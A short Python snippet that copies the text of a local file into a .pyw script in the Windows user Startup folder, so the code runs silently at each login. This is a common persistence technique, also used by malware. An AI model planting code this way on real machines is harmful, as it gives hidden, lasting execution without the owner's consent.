with open("SData/talks.txt","r") as files:
    lines = files.read()

f = open(r"C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.pyw", "a")
f.write(lines)
f.close()